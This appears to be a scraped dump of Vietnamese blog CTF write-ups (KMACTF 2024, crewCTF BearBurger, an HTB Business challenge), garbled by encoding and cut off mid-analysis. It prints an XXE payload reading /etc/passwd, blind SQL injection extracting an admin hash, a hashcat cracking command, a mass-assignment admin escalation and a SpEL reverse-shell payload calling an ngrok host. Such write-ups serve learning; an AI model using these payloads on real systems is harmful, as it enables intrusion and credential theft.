Ä‘Ã£ xin hint cá»§a ngÆ°á»i anh em C4t-f4t vá» hÆ°á»›ng giáº£i vÃ  nháº­n ra cÃ³ script cá»§a 1 bÃ i gáº§n tÆ°Æ¡ng tá»± táº¡i NahamCon 2021 dÃ¹ng Ä‘á»ƒ bypass jwt sá»­ dá»¥ng há»‡ máº­t Ä‘Æ°á»ng cong Eliptic. Lá»— há»•ng xáº£y ra khi sá»­ dá»¥ng thuáº­t toÃ¡n ECDSA mÃ  khÃ´ng thay Ä‘á»•i nonce, attacker cÃ³ thá»ƒ crack ra Ä‘Æ°á»£c private key. Äá»ƒ hiá»ƒu hÆ¡n thÃ¬ mÃ¬nh cÃ³ thá»ƒ tham kháº£o thÃªm táº¡i: https://asecuritysite.com/encryption/ecd5 Vá»›i 2 máº«u thÃ´ng Ä‘iá»‡p thÃ¬ mÃ¬nh cÃ³ thá»ƒ crack Ä‘Æ°á»£c secret key vÃ  forge ra Ä‘Æ°á»£c token cá»§a riÃªng mÃ¬nh Link write up Ä‘Ã³ táº¡i: https://github.com/milliesolem/writeups/blob/main/NahamCon%202021/Elliptical/solve.py MÃ¬nh chá»‰nh sá»­a 1 chÃºt cho phÃ¹ há»£p vá»›i bÃ i vÃ  chÃ¨n vÃ o pháº§n jwt payload\n1 {\u0026#34;username\u0026#34;:\u0026#34;kev1n\u0026#34;,\u0026#34;quirk\u0026#34;:\u0026#34;hero\u0026#34;} NhÆ°ng cÃ³ váº» quirk hero lÃ  khÃ´ng Ä‘Ãºng, quirk lÃ  tÃªn gá»i chung cá»§a cÃ¡c siÃªu nÄƒng lá»±c cá»§a máº¥y nhÃ¢n váº­t trong website, nÃªn mÃ¬nh náº£y ra Ã½ Ä‘á»‹nh lÃ  thá»­ vá»›i táº¥t cáº£ cÃ¡c quirk Ä‘Æ°á»£c giá»›i thiá»‡u trÃªn trang web, bao gá»“m:\n1 2 3 4 5 6 7 8 9 10 11 12 ONE FOR ALL HALF-COLD HALF-HOT EXPLOSION ALL FOR ONE DARK SHADOW CREATION HARDENING ENGINE INVISIBILITY FROG ANIVOICE HACKING Thá»­ Ä‘áº¿n cÃ¡i quirk cuá»‘i cÃ¹ng thÃ¬ mÃ¬nh má»›i tháº¥y route dashboard cÃ³ sá»± khÃ¡c biá»‡t, vÃ  mÃ¬nh cÅ©ng Ä‘á»ƒ Ã½ lÃ  tÃ¡c giáº£ Ä‘Ã£ hint Ä‘á»ƒ thÃ nh quirk nÃ y khi trang web Ä‘á» cáº­p Ä‘áº¿n ngÆ°á»i sá»Ÿ há»¯u quirk HACKING nÃªn liÃªn láº¡c vá»›i há»: Forge má»™t jwt má»›i, vÃ  giao diá»‡n lÃºc nÃ y Ä‘Ã£ thay Ä‘á»•i, cho phÃ©p ta Ä‘Æ°á»£c upload file docx: From docx to XXE Äáº§u tiÃªn mÃ¬nh gá»­i má»™t file docx valid thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ Ä‘áº¿m sá»‘ lÆ°á»£ng word cÃ³ trong doc Ä‘á»ƒ hiá»ƒn thá»‹ ra ngoÃ i: Äi mÃ² máº«m cÃ¡c file xml cÃ³ dÃ¹ng Ä‘á»ƒ khai thÃ¡c thÃ¬ em tÃ¬m Ä‘Æ°á»£c write up nÃ y: https://ctftime.org/writeup/24895, trong 1 file word sáº½ tá»“n táº¡i cÃ¡c file xml vÃ  thÆ° má»¥c sau: NhÆ° váº­y ta cÃ³ thá»ƒ tháº¥y file word thá»±c cháº¥t lÃ  tá»•ng há»£p cá»§a nhiá»u file xml, nÃªn mÃ¬nh cÃ³ thá»ƒ chÃ¨n file xml vÃ o trong file docx Ä‘á»ƒ thá»±c thi XXE. Trong writeup mÃ¬nh tham kháº£o thÃ¬ há» sá»­ dá»¥ng file docProps/app.xml chá»©a cÃ¡c thÃ´ng sá»‘ vá» file word, cá»¥ thá»ƒ nhÆ° sá»‘ dÃ²ng, sá»‘ chá»¯, sá»‘ trang,\u0026hellip; cá»§a file docx Ä‘Ã³ Ä‘á»ƒ inject vÃ o sá»‘ mÃ  website show ra -\u0026gt; Ä‘Ã³ lÃ  sá»‘ chá»¯ (words)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt;]\u0026gt; \u0026lt;Properties xmlns=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties\u0026#34; xmlns:vt=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes\u0026#34;\u0026gt; \u0026lt;Template\u0026gt;Normal.dotm\u0026lt;/Template\u0026gt; \u0026lt;TotalTime\u0026gt;0\u0026lt;/TotalTime\u0026gt; \u0026lt;Pages\u0026gt;1\u0026lt;/Pages\u0026gt; \u0026lt;Words\u0026gt;\u0026amp;xxe;\u0026lt;/Words\u0026gt; \u0026lt;Characters\u0026gt;4\u0026lt;/Characters\u0026gt; \u0026lt;Application\u0026gt;Microsoft Office Word\u0026lt;/Application\u0026gt; \u0026lt;DocSecurity\u0026gt;0\u0026lt;/DocSecurity\u0026gt; \u0026lt;Lines\u0026gt;100\u0026lt;/Lines\u0026gt; \u0026lt;Paragraphs\u0026gt;1\u0026lt;/Paragraphs\u0026gt; \u0026lt;ScaleCrop\u0026gt;false\u0026lt;/ScaleCrop\u0026gt; \u0026lt;Company\u0026gt;Reply\u0026lt;/Company\u0026gt; \u0026lt;LinksUpToDate\u0026gt;false\u0026lt;/LinksUpToDate\u0026gt; \u0026lt;CharactersWithSpaces\u0026gt;4000\u0026lt;/CharactersWithSpaces\u0026gt; \u0026lt;SharedDoc\u0026gt;false\u0026lt;/SharedDoc\u0026gt; \u0026lt;HyperlinksChanged\u0026gt;false\u0026lt;/HyperlinksChanged\u0026gt; \u0026lt;AppVersion\u0026gt;16.0000\u0026lt;/AppVersion\u0026gt; \u0026lt;/Properties\u0026gt; Tiáº¿n hÃ nh zip file xml nÃ y vÃ o file docx báº±ng command:\n1 zip a1.docx docProps/app.xml Ná»™i dung file Ä‘Ã£ hiá»‡n ra á»Ÿ website MÃ¬nh sáº½ Ä‘á»c flag báº±ng file:///flag.txt Upload file docx vÃ  mÃ¬nh Ä‘Ã£ cÃ³ Ä‘Æ°á»£c flag: Flag: KMACTF{3cd54_n0nc3_r3u53_4774ck_4nd_xx3_up104d} ","date":"2024-08-25T17:59:27Z","permalink":"https://kev1n1203.github.io/p/kma-ctf-2024/","title":"KMACTF 2024 write up"},{"content":"Preface Challenge nÃ y mÃ¬nh ngá»“i lÃ m tá»« Ä‘áº§u giáº£i Ä‘áº¿n cuá»‘i giáº£i nhÆ°ng Ä‘Ã£ khÃ´ng ká»‹p solve, vÃ¬ cay cÃº nÃªn mÃ¬nh sáº½ viáº¿t write up Ä‘á»ƒ lÆ°u láº¡i kiáº¿n thá»©c mÃ¬nh há»c Ä‘Æ°á»£c thÃ´ng qua challenge nÃ y. Bearburger lÃ  challenge mÃ  tÃ¡c giáº£ custom láº¡i code project Bear Burger Spring Boot táº¡i github. CÃ¡c chá»©c nÄƒng nhÆ° make admin, remove admin Ä‘Ã£ bá»‹ xÃ³a bá», mÃ¬nh cÃ³ thá»ƒ nÃ³i lÃ  1 phiÃªn báº£n tá»‘i giáº£n vÃ  \u0026ldquo;cÃ³ thá»ƒ khai thÃ¡c hÆ¡n\u0026rdquo; tá»« version trÃªn github\nSource code analysis Author tuy Ä‘Æ°a cáº£ file war nhÆ°ng láº¡i khÃ´ng cho file database, nÃªn mÃ¬nh pháº£i Ä‘i tÃ¬m file sql cá»§a src github Ä‘á»ƒ nhÃ©t vÃ o, vÃ  lÆ°u Ã½ khi láº¥y tá»« trÃªn Ä‘Ã³ vá» mÃ¬nh sáº½ cáº§n pháº£i khai bÃ¡o username lÃ  kiá»ƒu varchar(300) cho há»£p lÃ½ vá»›i khai bÃ¡o thuá»™c tÃ­nh Ä‘Ã³ trong model User:\n1 2 3 4 5 6 7 @Column( name = \u0026#34;Username\u0026#34; ) private @NotNull @Size( min = 4, max = 300 ) String username; SQL Injection in Order By Clause Thoáº¡t Ä‘áº§u mÃ¬nh nhÃ¬n thÃ¬ cÅ©ng spot Ä‘Æ°á»£c ngay chá»— khai thÃ¡c SQL Injection táº¡i endpoint: /api/v1/fetch-foods-by-category/{category}/{sorting}\n1 2 3 4 5 6 7 8 9 10 @RequestMapping({\u0026#34;/api/v1\u0026#34;}) public class FoodController { ... @GetMapping({\u0026#34;/fetch-foods-by-category/{category}/{sorting}\u0026#34;}) List\u0026lt;Food\u0026gt; fetchFoodsByCategory(@PathVariable String category, @PathVariable String sorting) { return this.foodService.findByCategory(category, sorting); } ... } API nÃ y gá»i Ä‘áº¿n method findByCategory náº±m táº¡i /service/FoodServiceImpl.class\n1 2 3 4 public List\u0026lt;Food\u0026gt; findByCategory(String category, String sorting) { String jpqlQuery = \u0026#34;SELECT f FROM Food f WHERE f.category = :category ORDER BY \u0026#34; + sorting + \u0026#34; DESC\u0026#34;; return this.entityManager.createQuery(jpqlQuery, Food.class).setParameter(\u0026#34;category\u0026#34;, category).getResultList(); } Cá»™ng chuá»—i nhÆ° tháº¿ kia thÃ¬ sure kÃ¨o lÃ  dÃ­nh SQL Injection rá»“i =))), nhÆ°ng viá»‡c inject vÃ o HQL vá»›i DBMS Ä‘áº±ng sau lÃ  MySQL mÃ¬nh tháº¥y khÃ¡ khÃ³ khÄƒn, khi viá»‡c HQL xá»­ lÃ½ giá»›i háº¡n sá»‘ báº£ng, nÃ³ chá»‰ cÃ³ thá»ƒ select Ä‘Æ°á»£c giÃ¡ trá»‹ tá»« nhá»¯ng báº£ng náº±m trong cÃ¡c thá»±c thá»ƒ Ä‘Ã£ Ä‘Æ°á»£c map vÃ  khai bÃ¡o, nÃªn ta cÅ©ng khÃ´ng Ä‘á»¥ng Ä‘Æ°á»£c Ä‘áº¿n Ä‘Æ°á»£c infomation_schema hay gÃ¬ cáº£, chá»‰ cÃ³ thá»ƒ dump data trong cÃ¡c báº£ng hiá»‡n táº¡i thÃ´i. LÃºc nÃ y mÃ¬nh nghÄ© trong Ä‘áº§u lÃ  lÃªn Ä‘Æ°á»£c admin báº±ng cÃ¡ch nÃ o, trong khi password Ä‘Æ°á»£c mÃ£ hÃ³a Bcrypt cÆ¡ chá»© :)), cháº£ nháº½ crack Ä‘áº¿n cháº¿t. Tháº­t báº¥t ngá» intended lÃ  crack password tháº­t (mÃ¬nh máº¥t pháº§n lá»›n thá»i gian cá»§a 2 ngÃ y Ä‘á»ƒ tÃ¬m cÃ¡ch thá»±c hiá»‡n cÃ¢u lá»‡nh update hay insert nhÆ°ng tháº¥t báº¡i). ThÃ´i khÃ´ng dÃ i dÃ²ng, mÃ¬nh tiáº¿n hÃ nh craft payload extract data boolean based nhÆ° sau:\n1 extractvalue(null,concat(\u0026#39;~\u0026#39;,(select password from User u where u.username = \u0026#39;admin\u0026#39;),\u0026#39;~\u0026#39;)) Náº¿u nhÆ° request select thÃ nh cÃ´ng, sáº½ tráº£ vá» lá»—i khÃ´ng thá»ƒ láº¥y resultSet vÃ¬ payload trigger lá»—i error based: CÃ²n náº¿u nhÆ° cÃ¢u query sai, thÃ¬ server sáº½ khÃ´ng trigger error based nÃªn sáº½ hiá»ƒn thá»‹ Ä‘Æ°á»£c thÃ´ng tin bÃ¬nh thÆ°á»ng: Váº­y lÃ  payload cá»§a mÃ¬nh work, nhÆ°ng káº¿t quáº£ thÃ¬ khÃ´ng Ä‘Æ°á»£c tráº£ ra, nÃªn giá» mÃ¬nh sáº½ craft Ä‘á»ƒ extract password báº±ng cÃ¡ch blind thÃ´i\n1 extractvalue(null,concat(\u0026#39;~\u0026#39;,(select password from User u where u.username = \u0026#39;admin\u0026#39; and binary(substr(u.password,1,1)) = \u0026#39;$\u0026#39;),\u0026#39;~\u0026#39;)) VÃ¬ mÃ¬nh biáº¿t máº­t kháº©u Ä‘Æ°á»£c hash theo kiá»ƒu Bcrypt nÃªn Ä‘oáº¡n kÃ½ tá»± Ä‘áº§u lÃºc nÃ o cÅ©ng kiá»ƒu $2a$10, thá»­ kÃ­ tá»± Ä‘áº§u lÃ  $ thÃ¬ payload Ä‘Ã£ tráº£ vá» lá»—i (Ä‘Ãºng nhÆ° dá»± Ä‘oÃ¡n): Tá»‘t rá»“i, Ä‘Æ°a vÃ o intruder thÃ´i, Bcrypt hash ra Ä‘á»™ dÃ i cá»‘ Ä‘á»‹nh lÃ  60. MÃ¬nh cÃ³ Ä‘Æ°á»£c káº¿t quáº£ hash admin local lÃ : $2a$10$3l0p7n2pIIykRYaPsPbvt.8y60kvynF9E7Q6e21sMi7tBRPqL8zvS, hashcat mÃ¬nh cÃ³ Ä‘Æ°á»£c pass local lÃ  admin =)), yáº¿u tháº­t VÃ¡c payload sang challenge tháº­t, mÃ¬nh cÃ³ hash dump Ä‘Æ°á»£c lÃ : $2a$10$vFWElvoCouv8LuyTzOCT8eMq4KSvvbxEPpwRdXcJvDkSmVUbmooTW NhÃ©t hash vÃ o file hash-2, cháº¡y hashcat attack mode 3200 theo https://hashcat.net/wiki/doku.php?id=example_hashes\n1 hashcat -m 3200 -a 0 hash-2 /usr/share/wordlists/rockyou.txt --force MÃ¬nh cÃ³ máº­t kháº©u admin táº¡i web challenge lÃ  adidas, quÃ¡ yáº¿u =)))\nSpEL Injection in fetchAllUser Leo lÃªn Ä‘Æ°á»£c admin, mÃ¬nh diff code vá»›i project cÃ³ trÃªn github thÃ¬ tháº¥y Ä‘oáº¡n code fetchAllUser dÃ­nh lá»—i parseExpression tÃªn cá»§a user, chá»©c nÄƒng nÃ y náº±m táº¡i api /api/v1/admin vá»‘n chá»‰ Ä‘Æ°á»£c truy cáº­p khi ngÆ°á»i dÃ¹ng cÃ³ role ADMIN:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 @RequestMapping({\u0026#34;/api/v1/admin\u0026#34;}) public class UserController { ... @GetMapping({\u0026#34;/fetch-all-users\u0026#34;}) List\u0026lt;User\u0026gt; fetchUsersByUsers() { return this.userService.fetchAllUsers(); } ... } @Transactional( readOnly = true ) public List\u0026lt;User\u0026gt; fetchAllUsers() { List\u0026lt;User\u0026gt; result = this.userRepository.findAll(); ExpressionParser userParser = new SpelExpressionParser(); Iterator var3 = result.iterator(); while(var3.hasNext()) { User user = (User)var3.next(); try { Expression expression = userParser.parseExpression(user.getUsername()); String var6 = (String)expression.getValue(String.class); } catch (Exception var7) { } } return result; } Giá» mÃ¬nh Ä‘Ã£ hiá»ƒu lÃ­ do táº¡i sao láº¡i kÃ©o username lÃªn 300 kÃ­ tá»± khi ban Ä‘áº§u cÃ³ 15 kÃ­ tá»± thÃ´i =)) Giá» mÃ¬nh sáº½ register payload reverse shell xem sao, payload reverse shell mÃ¬nh tham kháº£o tá»« https://github.com/welk1n/ReverseShell-Java:\n1 T(java.lang.Runtime).getRuntime().exec(\u0026#39;bash -c $@|bash 0 echo bash -i \u0026gt;\u0026amp; /dev/tcp/0.tcp.ap.ngrok.io/14482 0\u0026gt;\u0026amp;1\u0026#39;) ChÃ¨n payload vÃ o username, mÃ¬nh báº¯t intercept cho tiá»‡n: Gá»­i request vÃ  mÃ¬nh rev shell thÃ nh cÃ´ng: Sau Ä‘Ã³ lÃ  khoáº£ng thá»i gian mÃ¬nh Ä‘i tÃ¬m flag =)), tÃ¬m á»Ÿ cÃ¡c file enciron hay há»‡ thá»‘ng khÃ´ng cÃ³, mÃ¬nh tÃ¬m cáº£ á»Ÿ db nhÆ°ng cÅ©ng khÃ´ng cÃ³: MÃ¬nh ngá»‘ quÃ¡, khÃ´ng nháº­n ra lÃ  flag náº±m ngay táº¡i thÆ° má»¥c chá»©a file war mÃ  cá»© Ä‘i tÃ¬m =)) (mÃ¬nh khÃ´ng Ä‘á»ƒ Ã½ tÃªn file) Flag: crew{BearBurger_is_on_sale!_LINZ_IS_HERE}\nAnother Workaround to Admin Khi mÃ¬nh Ä‘i há»i nhá»¯ng ngÆ°á»i Ä‘Ã£ solve Ä‘Æ°á»£c challenge thÃ¬ nháº­n Ä‘Æ°á»£c cÃ¡ch khÃ¡c vá»›i cÃ¡ch intended cá»§a tÃ¡c giáº£, Ä‘Ã³ lÃ  khai thÃ¡c mass assignment vÃ o register Ä‘á»ƒ táº¡o thÃªm 1 role ná»¯a cho mÃ¬nh. Äoáº¡n code xá»­ lÃ½ cá»§a chá»©c nÄƒng register khÃ¡ Ä‘Æ¡n giáº£n, nÃ³ chá»‰ hash máº­t kháº©u trÆ°á»›c khi lÆ°u vÃ o báº£ng user, vÃ  lÆ°u 1 hÃ ng mang luÃ´n giÃ¡ trá»‹ CUSTOMER vÃ o báº£ng roles:\n1 2 3 4 5 6 7 8 9 10 11 12 public void registerUser(User user) { user.setPassword(this.passwordEncoder.encode(user.getPassword())); this.userRepository.save(user); this.roleRepository.save(new Role(user.getUserID())); } .... public Role(int userID) { this.userID = userID; this.name = \u0026#34;CUSTOMER\u0026#34;; } LÃºc nÃ y, mÃ¬nh sáº½ cÃ³ thá»ƒ truyá»n vÃ o 1 hÃ ng má»›i user cá»§a mÃ¬nh báº±ng cÃ¡ch sau:\n1 roles[0].roleID.=1\u0026amp;roles[0].userID=1\u0026amp;roles[0].name=ADMIN Trong db ta cÃ³ ngÆ°á»i dÃ¹ng Ä‘Ã³ vá»›i userID 18: Táº¡i báº£ng roles thÃ¬ ta cÃ³ 2 hÃ ng Ä‘á»ƒ chá»©a role cá»§a user kev1n-3 lÃ  CUSTOMER vÃ  ADMIN: Sá»‘ cá»§a roleID vÃ  userID truyá»n vÃ o khÃ´ng quan trá»ng, mÃ¬nh cÃ³ thá»ƒ truyá»n gÃ¬ cÅ©ng Ä‘Æ°á»£c nhÆ°ng báº¯t buá»™c cáº§n truyá»n giÃ¡ trá»‹ vÃ o, vÃ¬ 2 biáº¿n nÃ y sáº½ Ä‘Æ°á»£c gen ra tÆ°Æ¡ng á»©ng trong báº£ng khi khá»Ÿi táº¡o user vÃ  khá»Ÿi táº¡o Ä‘á»‘i tÆ°á»£ng Role báº±ng userID. Theo nhÆ° mÃ¬nh hiá»ƒu lÃ  sau khi nÃ³ save Ä‘á»‘i tÆ°á»£ng user thÃ¬ row role ADMIN sáº½ Ä‘Æ°á»£c save, sau Ä‘Ã³ role CUSTOMER Ä‘Æ°á»£c save sau Ä‘Ã³ táº¡i cÃ¢u lá»‡nh bÃªn dÆ°á»›i.\n","date":"2024-08-05T09:47:56Z","permalink":"https://kev1n1203.github.io/p/crewctf-2024/","title":"crewCTF2024 - BearBurger"},{"content":"Trong giáº£i HTB Business nÃ y, mÃ¬nh tham gia vÃ o lÃ m challenge Omniwatch vÃ  Magicom cÃ¹ng vá»›i cÃ¡c teammates trong cÃ¢u láº¡c bá»™. ChÃºng mÃ¬nh Ä‘Ã£ solve Ä‘Æ°á»£c challenge Omniwatch, cÃ²n Magicom thÃ¬ gáº§n nhÆ° Ä‘Ã£ lÃ m Ä‘Æ°á»£c, chá»‰ thiáº¿u má»™t bÆ°á»›c ná»¯a nhÆ°ng chÃºng mÃ¬nh Ä‘Ã£ Ä‘i sai hÆ°á»›ng vÃ  khÃ´ng tÃ¬m ra cÃ¡ch giáº£i ká»‹p giá» nÃªn khÃ´ng ká»‹p solve. MÃ¬nh muá»‘n viáº¿t lÃ  Ä‘á»ƒ chia sáº» láº¡i quÃ¡ trÃ¬nh giáº£i challenge cá»§a mÃ¬nh vÃ  cÃ¡c teammates, vÃ  cÅ©ng nhÆ° lÃ  hÆ°á»›ng giáº£i Ä‘Ãºng Ä‘áº¯n Ä‘á»ƒ solve challenge. MÃ¬nh Ä‘Ã£ tham kháº£o official solution vÃ  nháº­n ra anh em Ä‘Ã£ Ä‘i Ä‘Ãºng gáº§n háº¿t cÃ¡c bÆ°á»›c, chá»‰ cÃ³ bÆ°á»›c Ä‘áº§u lÃ  chÆ°a ra, nÃªn bÆ°á»›c Ä‘áº§u cá»§a mÃ¬nh sáº½ Ä‘i theo con Ä‘Æ°á»ng cá»§a official write up. MÃ¬nh sáº½ tiáº¿n hÃ nh vÃ o khai thÃ¡c táº¡i local vÃ¬ mÃ¬nh viáº¿t write up nÃ y hÆ¡i muá»™n nÃªn khÃ´ng deploy trÃªn server ká»‹p=))\nPreface Challenge xuáº¥t hiá»‡n dÆ°á»›i dáº¡ng má»™t website cÃ³ chá»©c nÄƒng xem sáº£n pháº©m vÃ  thÃªm sáº£n pháº©m, ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ thÃªm sáº£n pháº©m vÃ  má»™t sá»‘ cÃ¡c thÃ´ng tin cá»§a sáº£n pháº©m, trong Ä‘Ã³ lÃ  pháº§n áº£nh minh há»a: ÄÃ£ Ä‘Æ°á»£c add product tÃ¹y theo Ã½ mÃ¬nh mÃ  cÃ²n unauthen, mÃ¬nh ban Ä‘áº§u cÅ©ng nghÄ© upload php Ä‘á»ƒ RCE: PhÃ¢n TÃ­ch Source Code Config Ngay sau khi mÃ¬nh má»Ÿ source cá»§a challenge mÃ¬nh Ä‘Ã£ tháº¥y Ä‘Ã¢y cháº¯c cháº¯n khÃ´ng pháº£i lÃ  má»™t challenge upload file PHP thÃ´ng thÆ°á»ng. VÃ¬ challenge cung cáº¥p cáº£ phpinfo táº¡i /info, vÃ  file php.ini, mÃ¬nh nhÃ¬n sÆ¡ qua qua thÃ¬ cÅ©ng chÆ°a cÃ³ gÃ¬ báº¥t thÆ°á»ng, nhÆ°ng cháº¯c cháº¯n lÃ  mÃ¬nh cáº§n pháº£i dÃ¹ng Ä‘áº¿n chÃºng.\n1 2 3 $router-\u0026gt;get(\u0026#39;/info\u0026#39;, function(){ return phpinfo(); }); Source Code Challenge Ä‘Ã£ quy Ä‘á»‹nh nhá»¯ng route cÃ³ thá»ƒ truy cáº­p táº¡i website trong index.php:\n1 2 3 4 5 6 7 8 9 10 $router = new Router; $router-\u0026gt;get(\u0026#39;/\u0026#39;, \u0026#39;HomeController@index\u0026#39;); $router-\u0026gt;get(\u0026#39;/home\u0026#39;, \u0026#39;HomeController@index\u0026#39;); $router-\u0026gt;get(\u0026#39;/product\u0026#39;, \u0026#39;ProductViewController@index\u0026#39;); $router-\u0026gt;get(\u0026#39;/addProduct\u0026#39;, \u0026#39;AddProductController@index\u0026#39;); $router-\u0026gt;post(\u0026#39;/addProduct\u0026#39;, \u0026#39;AddProductController@add\u0026#39;); $router-\u0026gt;get(\u0026#39;/info\u0026#39;, function(){ return phpinfo(); }); MÃ¬nh ngay láº­p tá»©c Ä‘i tÃ¬m kiáº¿m nhá»¯ng Ä‘oáº¡n code xá»­ lÃ½ upload file:\nmodels/ImageModel.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 class ImageModel { public function __construct($file) { $this-\u0026gt;file = $file; } public function isValid() { $allowed_extensions = [\u0026#34;jpeg\u0026#34;, \u0026#34;jpg\u0026#34;, \u0026#34;png\u0026#34;]; $file_extension = pathinfo($this-\u0026gt;file[\u0026#34;name\u0026#34;], PATHINFO_EXTENSION); print_r($this-\u0026gt;file); if (!in_array($file_extension, $allowed_extensions)) { return false; } $allowed_mime_types = [\u0026#34;image/jpeg\u0026#34;, \u0026#34;image/jpg\u0026#34;, \u0026#34;image/png\u0026#34;]; $mime_type = mime_content_type($this-\u0026gt;file[\u0026#39;tmp_name\u0026#39;]); if (!in_array($mime_type, $allowed_mime_types)) { return false; } if (!getimagesize($this-\u0026gt;file[\u0026#39;tmp_name\u0026#39;])) { return false; } return true; } } Class nÃ y Ä‘Æ°á»£c gá»i trong request xá»­ lÃ½ file nÃªn mÃ¬nh muá»‘n nÃ³i vá» nÃ³ trÆ°á»›c. QuÃ¡ trÃ¬nh kiá»ƒm duyá»‡t file Ä‘Æ°á»£c gÃ³i gá»n trong hÃ m isValid() File extension Ä‘Æ°á»£c láº¥y báº±ng PATHINFO_EXTENSION vÃ  Ä‘Æ°á»£c whitelist =\u0026gt; loáº¡i bá» kháº£ nÄƒng bypass upload file php bypass báº±ng extension file Sá»­ dá»¥ng print_r Ä‘á»ƒ in ra máº£ng thÃ´ng tin cá»§a file Ä‘Ã³ theo dáº¡ng [key] =\u0026gt; value Sau khi check extension class tiáº¿p tá»¥c check mime types báº±ng cÃ¡ch whitelist, vÃ  cuá»‘i cÃ¹ng lÃ  check size báº±ng getimagesize. MÃ¬nh gáº§n nhÆ° khÃ´ng tháº¥y cÆ¡ há»™i nÃ o Ä‘á»ƒ upload file PHP mÃ  RCE Ä‘Æ°á»£c, nhÆ°ng Ä‘oáº¡n print_r thÃ´ng tin khÃ¡ thÃº vá»‹, vÃ¬ nÃ³ chá»©a giÃ¡ trá»‹ tmp_name controllers/AddProductController.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 public function add() { if (empty($_FILES[\u0026#39;image\u0026#39;]) || empty($_POST[\u0026#39;title\u0026#39;]) || empty($_POST[\u0026#39;description\u0026#39;])) { header(\u0026#39;Location: /addProduct?error=1\u0026amp;message=Fields can\\\u0026#39;t be empty.\u0026#39;); exit; } $title = $_POST[\u0026#34;title\u0026#34;]; $description = $_POST[\u0026#34;description\u0026#34;]; $image = new ImageModel($_FILES[\u0026#34;image\u0026#34;]); if($image-\u0026gt;isValid()) { $mimeType = mime_content_type($_FILES[\u0026#34;image\u0026#34;][\u0026#39;tmp_name\u0026#39;]); $extention = explode(\u0026#39;/\u0026#39;, $mimeType)[1]; $randomName = bin2hex(random_bytes(8)); $secureFilename = \u0026#34;$randomName.$extention\u0026#34;; if(move_uploaded_file($_FILES[\u0026#34;image\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;uploads/$secureFilename\u0026#34;)) { $this-\u0026gt;product-\u0026gt;insert($title, $description, \u0026#34;uploads/$secureFilename\u0026#34;); header(\u0026#39;Location: /addProduct?error=0\u0026amp;message=Product added successfully.\u0026#39;); exit; } } else { header(\u0026#39;Location: /addProduct?error=1\u0026amp;message=Not a valid image.\u0026#39;); exit; } } Náº¿u cÃ³ dáº¥u hiá»‡u upload file, webserver Ä‘Æ°a nÃ³ vÃ o class ImageModel Ä‘á»ƒ sá»­ dá»¥ng hÃ m isValid Ä‘á»ƒ check, náº¿u nhÆ° return true thÃ¬ láº¥y extension file báº±ng cÃ¡ch bá»• Ä‘Ã´i cÃ¡i mime type mÃ  láº¥y cÃ¡i thá»© 2 -\u0026gt; Ä‘oáº¡n nÃ y khÃ¡ lá»ng láº»o vÃ¬ giÃ¡ trá»‹ Ä‘Ã³ mÃ¬nh control Ä‘Æ°á»£c nhÆ°ng Ä‘áº±ng trÆ°á»›c lÃ  whitelist nÃªn Ä‘Ã nh chá»‹u Gáº¯n file extension vá»«a láº¥y Ä‘Æ°á»£c vá»›i 16 kÃ½ tá»± random Ä‘Æ°á»£c gen báº±ng bin2hex(random_bytes(8)), move vÃ o thÆ° má»¥c uploads vÃ  tráº£ vá» thÃ´ng bÃ¡o vÃ  lá»—i náº¿u cÃ³. RiÃªng Ä‘oáº¡n code check valid táº¡i class ImageModel Ä‘Ã£ lÃ m cho mÃ¬nh khÃ´ng tin tÆ°á»Ÿng vÃ o viá»‡c cÃ³ thá»ƒ bypass upload file PHP ná»¯a, máº·c dÃ¹ Ä‘oáº¡n láº¥y extension á»Ÿ controller khÃ¡ ngon nhÆ°ng hÃ m valid láº¡i quÃ¡ cháº·t nÃªn mÃ¬nh Ä‘i Ä‘á»c nhá»¯ng file khÃ¡c vÃ¬ cÃ²n ráº¥t nhiá»u thá»© chÆ°a Ä‘Æ°á»£c sá»­ dá»¥ng. ÄÃ¡ng chÃº Ã½ nháº¥t cháº¯c cháº¯n lÃ  file cli/cli.php, nÃ³ vá»‘n Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ import file sql chá»©a cÃ¡c sáº£n pháº©m máº·c Ä‘á»‹nh vÃ o database báº±ng command line, sau Ä‘Ã³ file sql sáº½ bá»‹ xÃ³a:\n1 2 php /www/cli/cli.php -c /www/cli/conf.xml -m import -f /www/products.sql rm /www/products.sql VÃ¬ pha import nÃ y quÃ¡ cá»“ng ká»nh, cháº£ cÃ³ lÃ­ do gÃ¬ pháº£i lÃ m háº³n 1 file php chá»‰ Ä‘á»ƒ import 1 file sql vÃ o, nÃªn mÃ¬nh cháº¯c cháº¯n sáº½ khai thÃ¡c tá»« file nÃ y ra: Ngay tá»« Ä‘áº§u file Ä‘Ã£ Ä‘Ã¡nh phá»§ Ä‘áº§u báº±ng viá»‡c check xem file cÃ³ Ä‘Æ°á»£c thá»±c thi thÃ´ng qua dÃ²ng lá»‡nh hay khÃ´ng:\n1 2 3 if (!isset( $_SERVER[\u0026#39;argv\u0026#39;], $_SERVER[\u0026#39;argc\u0026#39;] ) || !$_SERVER[\u0026#39;argc\u0026#39;]) { die(\u0026#34;This script must be run from the command line!\u0026#34;); } argv vÃ  argc lÃ  2 biáº¿n siÃªu toÃ n cá»¥c, trong Ä‘Ã³ argv sáº½ lÃ  má»™t máº£ng lÆ°u giÃ¡ trá»‹ cá»§a cÃ¡c tham sá»‘ truyá»n Ä‘Æ°á»£c truyá»n vÃ o file php dÆ°á»›i dáº¡ng máº£ng [sá»‘ thá»© tá»±] =\u0026gt; value. CÃ²n argc sáº½ chá»©a sá»‘ 